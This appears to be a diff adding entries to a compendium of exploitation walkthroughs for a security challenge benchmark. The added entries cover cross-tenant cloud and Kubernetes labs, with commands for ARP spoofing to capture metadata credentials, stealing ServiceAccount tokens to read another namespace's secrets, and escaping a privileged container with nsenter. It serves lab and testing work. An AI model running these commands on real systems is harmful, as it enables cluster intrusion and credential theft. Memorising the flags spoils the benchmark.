@@ -6,7 +6,7 @@
 ## 目录
 
 - [一、单点场景](#一单点场景)
-  - [1.1 Docker：Web / 数据库 / Linux / DEF / NET / CI / LKX](#11-dockerweb--数据库--linux--def--net--ci--lkx)
+  - [1.1 Docker：Web / 数据库 / Linux / Cloud / DEF / NET / CI / LKX](#11-dockerweb--数据库--linux--cloud--def--net--ci--lkx)
   - [1.2 Kubernetes 单点场景](#12-kubernetes-单点场景)
   - [1.3 Active Directory 单点场景](#13-active-directory-单点场景)
 - [二、攻击链场景（43）](#chains-section)
@@ -2819,6 +2819,8 @@ Discover IdP key leak → steal private key → forge SAML assertion → AssumeR
 
 ---
 
+---
+
 <!-- source: benchmarks/cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->
 
 ### CLOUD-14: PassRole Abuse → Cross-Service Lambda Execution
@@ -2988,6 +2990,109 @@ curl 'http://localhost:10618/bypass?tag=AzureCloud'
 
 
 ---
+
+---
+
+<!-- source: benchmarks/cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->
+
+### CLOUD-20: Shared Metadata Proxy → Cross-Tenant Credential Leak
+
+#### Overview
+| Property | Value |
+|----------|-------|
+| CVE/Technique | N/A (shared proxy tenant isolation failure) |
+| Difficulty | L3 |
+| Port | 10620 |
+| Path | docker/cloud/shared-metadata-proxy |
+| Type | docker |
+
+#### Attack Path Summary
+Tenant B forges X-Tenant-ID header → shared metadata proxy returns Tenant A credentials → cross-tenant data access
+
+#### Prerequisites
+- Multi-tenant cloud architecture and tenant isolation models
+- Azure WireServer / host-agent channel concepts
+- HTTP header manipulation for tenant impersonation
+
+#### Step-by-Step Exploitation
+##### Step 1: Forge Tenant Identity Header
+```bash
+curl -s http://localhost:10620/steal?tenant=tenant-a
+```
+
+#### Flag Location
+- Flag 1: /flag.txt in Tenant A container
+- Flag 2: Metadata proxy response (Tenant A credentials)
+
+---
+
+---
+
+<!-- source: benchmarks/cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->
+
+### CLOUD-21: Global S3 Namespace Squatting → Cross-Tenant Data Theft
+
+#### Overview
+| Property | Value |
+|----------|-------|
+| CVE/Technique | N/A (global namespace resource squatting) |
+| Difficulty | L3 |
+| Port | 10621 |
+| Path | docker/cloud/global-s3-squatting |
+| Type | docker |
+
+#### Attack Path Summary
+Predict bucket naming pattern → discover pre-existing victim bucket → read cross-tenant data from shared S3 namespace
+
+#### Prerequisites
+- AWS S3 global namespace model and bucket naming conventions
+- Cross-tenant resource enumeration in shared services
+- CloudFormation auto-generated resource naming patterns
+
+#### Step-by-Step Exploitation
+##### Step 1: Enumerate Predictable Bucket Names
+```bash
+curl 'http://localhost:10621/explore?bucket=prod-assets-2024'
+```
+
+#### Flag Location
+- Flag 1: /flag.txt in Tenant A container
+- Flag 2: S3 object prod-assets-2024/flag.txt (victim tenant data)
+
+---
+
+---
+
+<!-- source: benchmarks/cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->
+
+### CLOUD-22: Shared AI Inference Queue → Cross-Tenant Data Leak
+
+#### Overview
+| Property | Value |
+|----------|-------|
+| CVE/Technique | N/A (multi-tenant queue isolation failure) |
+| Difficulty | L3 |
+| Port | 10622 |
+| Path | docker/cloud/shared-inference-queue |
+| Type | docker |
+
+#### Attack Path Summary
+Enumerate shared inference queue → discover victim tenant jobs → read sensitive input data including flag
+
+#### Prerequisites
+- Multi-tenant AI/ML inference infrastructure
+- Queue-based job scheduling in shared GPU fabric
+- Cross-tenant data isolation in managed AI services
+
+#### Step-by-Step Exploitation
+##### Step 1: Enumerate Shared Queue
+```bash
+curl -X POST http://localhost:10622/enum
+```
+
+#### Flag Location
+- Flag 1: /flag.txt in Tenant A container
+- Flag 2: Victim tenant job input_data (contains flag in credit card field)
 
 ---
 
@@ -3791,7 +3896,7 @@ ssh -p 10902 attacker@localhost \
 
 <!-- source: benchmarks/cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->
 
-### CI-01:
+### CI-01: Poisoned Pipeline Execution
 
 #### Overview
 | Property | Value |
@@ -5639,6 +5744,173 @@ kubectl exec ptrace-pod -- ps aux | grep kubelet
 
 ## Verify gdb is available
 kubectl exec ptrace-pod -- which gdb
+```
+
+---
+
+<!-- source: benchmarks/cve_challenges/docs/scenarios/k8s/cloud-02-cap-netraw-exploitation.md -->
+
+## CLOUD-02: Container Escape via CAP_NET_RAW → Metadata MITM
+
+### Overview
+| Property | Value |
+|----------|-------|
+| CVE/Technique | N/A (CAP_NET_RAW + ARP spoofing) |
+| Difficulty | L3 |
+| Type | k8s |
+| Path | docker/cloud/cap-netraw-metadata |
+
+### Attack Path Summary
+CAP_NET_RAW capability → ARP spoofing → intercept victim→metadata traffic → steal IMDS credentials
+
+### Prerequisites
+#### Knowledge
+- Linux capabilities (CAP_NET_RAW) and network stack manipulation
+- ARP spoofing and man-in-the-middle attack techniques
+- EC2 Instance Metadata Service (IMDS) protocol
+
+#### Tools
+- arpspoof / ettercap: ARP spoofing tools
+- tcpdump / wireshark: Network traffic capture and analysis
+
+### Step-by-Step Exploitation
+#### Step 1: Deploy Attacker Pod with CAP_NET_RAW
+**Flag:** `flag{cloud-02-step1-netraw}`
+
+```bash
+kubectl get pods
+kubectl exec -it attacker -- sh
+```
+
+#### Step 2: ARP Spoof + Metadata Interception
+Use CAP_NET_RAW to redirect victim pod traffic through attacker, capturing IMDS credentials.
+
+```bash
+arpspoof -i eth0 -t <victim_ip> <gateway_ip>
+tcpdump -i eth0 -A port 5000
+```
+
+#### Step 3: Use Stolen Credentials
+Use captured IMDS credentials to access protected cloud resources.
+
+### Flag Location
+- Flag: Environment variable in victim pod
+
+### Verification Commands
+```bash
+kubectl exec attacker -- cat /proc/1/status | grep Cap
+kubectl exec victim -- env | grep FLAG
+```
+
+---
+
+<!-- source: benchmarks/cve_challenges/docs/scenarios/k8s/cloud-03-sa-cross-ns-exploitation.md -->
+
+## CLOUD-03: K8s SA Token → Cross-Namespace Access
+
+### Overview
+| Property | Value |
+|----------|-------|
+| CVE/Technique | N/A (overly permissive RBAC) |
+| Difficulty | L3 |
+| Type | k8s |
+| Path | docker/cloud/sa-cross-namespace |
+
+### Attack Path Summary
+Compromise pod in tenant-a → extract broad ServiceAccount token → use k8s API to access tenant-b resources → read cross-namespace flag
+
+### Prerequisites
+#### Knowledge
+- Kubernetes RBAC: ServiceAccounts, ClusterRoles, ClusterRoleBindings
+- K8s API authentication with bearer tokens
+- Namespace isolation and cross-namespace access patterns
+
+#### Tools
+- kubectl: Kubernetes cluster interaction
+- curl: HTTP requests to k8s API
+
+### Step-by-Step Exploitation
+#### Step 1: Extract SA Token from Attacker Pod
+**Flag:** `flag{cloud-03-step1-sa}`
+
+```bash
+kubectl exec -it -n tenant-a attacker -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
+```
+
+#### Step 2: Use SA Token to Access tenant-b Resources
+Use the broad SA token to list secrets and exec into pods in tenant-b.
+
+```bash
+TOKEN=$(kubectl exec -n tenant-a attacker -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+kubectl get secrets -n tenant-b --token=$TOKEN
+kubectl get secret target-flag -n tenant-b -o jsonpath='{.data.flag}' --token=$TOKEN | base64 -d
+```
+
+### Flag Location
+- Flag: Secret `target-flag` in namespace `tenant-b`
+
+### Verification Commands
+```bash
+kubectl get clusterrolebinding broad-binding -o yaml
+kubectl auth can-i get secrets -n tenant-b --as=system:serviceaccount:tenant-a:broad-sa
+```
+
+---
+
+<!-- source: benchmarks/cve_challenges/docs/scenarios/k8s/cloud-19-multitenant-exploitation.md -->
+
+## CLOUD-19: Multi-Tenant K8s: Container Escape → Cross-Tenant Access
+
+### Overview
+| Property | Value |
+|----------|-------|
+| CVE/Technique | N/A (privileged container + hostPID escape) |
+| Difficulty | L3 |
+| Type | k8s |
+| Path | docker/cloud/multi-tenant-k8s |
+
+### Attack Path Summary
+Deploy privileged pod in tenant-a → nsenter to host → discover bridge SA token → kubectl exec into tenant-b pod → read cross-tenant flag
+
+### Prerequisites
+#### Knowledge
+- Container escape techniques (privileged mode, hostPID, nsenter)
+- Kubernetes node-level ServiceAccount tokens (bridge SA)
+- Multi-tenant K8s architecture (shared control plane)
+
+#### Tools
+- nsenter: Enter host namespaces from privileged container
+- kubectl: K8s API interaction using bridge ServiceAccount token
+
+### Step-by-Step Exploitation
+#### Step 1: Escape Privileged Container to Host
+```bash
+kubectl exec -it -n tenant-a attacker -- sh
+nsenter --target 1 --mount --uts --ipc --net --pid -- sh
+```
+
+#### Step 2: Discover Bridge SA Token
+On the host node, locate the bridge ServiceAccount token used for cross-tenant k8s API access.
+
+```bash
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+```
+
+#### Step 3: Cross-Tenant Pod Access
+Use the bridge SA token to exec into the target pod in tenant-b.
+
+```bash
+kubectl exec -it -n tenant-b target -- env | grep FLAG
+```
+
+### Flag Location
+- Flag: Environment variable in tenant-b target pod
+
+### Verification Commands
+```bash
+kubectl get pods -n tenant-a
+kubectl get pods -n tenant-b
+kubectl exec -n tenant-a attacker -- cat /proc/1/status | grep -E 'Seccomp|Cap'
 ```
 
 ---
@@ -14107,7 +14379,7 @@ cd ../../ad && docker compose up -d --build
 
 ## 附录 B：源文件索引
 
-共 **158** 个源文件纳入本汇总。
+共 **164** 个源文件纳入本汇总。
 
 | 源文件 | 汇总章节 |
 |--------|----------|
@@ -14163,6 +14435,9 @@ cd ../../ad && docker compose up -d --build
 | `benchmarks/cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / CLOUD-16 |
 | `benchmarks/cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / CLOUD-17 |
 | `benchmarks/cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / CLOUD-18 |
+| `benchmarks/cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / CLOUD-20 |
+| `benchmarks/cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / CLOUD-21 |
+| `benchmarks/cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / CLOUD-22 |
 | `benchmarks/cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / DEF-01 |
 | `benchmarks/cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / DEF-02 |
 | `benchmarks/cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / DEF-03 |
@@ -14187,6 +14462,9 @@ cd ../../ad && docker compose up -d --build
 | `benchmarks/cve_challenges/docs/scenarios/k8s/k8s-11-privileged-breakout-exploitation.md` | 1.2 K8s / K8S-11 |
 | `benchmarks/cve_challenges/docs/scenarios/k8s/k8s-14-cap-sys-admin-exploitation.md` | 1.2 K8s / K8S-14 |
 | `benchmarks/cve_challenges/docs/scenarios/k8s/k8s-19-ptrace-inject-exploitation.md` | 1.2 K8s / K8S-19 |
+| `benchmarks/cve_challenges/docs/scenarios/k8s/cloud-02-cap-netraw-exploitation.md` | 1.2 K8s / CLOUD-02 |
+| `benchmarks/cve_challenges/docs/scenarios/k8s/cloud-03-sa-cross-ns-exploitation.md` | 1.2 K8s / CLOUD-03 |
+| `benchmarks/cve_challenges/docs/scenarios/k8s/cloud-19-multitenant-exploitation.md` | 1.2 K8s / CLOUD-19 |
 | `benchmarks/cve_challenges/docs/scenarios/k8s/k8s-12-hostpath-escape-exploitation.md` | 1.2 K8s / K8S-12 |
 | `benchmarks/cve_challenges/docs/scenarios/k8s/k8s-16-cri-socket-exploitation.md` | 1.2 K8s / K8S-16 |
 | `benchmarks/cve_challenges/docs/scenarios/k8s/k8s-17-docker-socket-exploitation.md` | 1.2 K8s / K8S-17 |
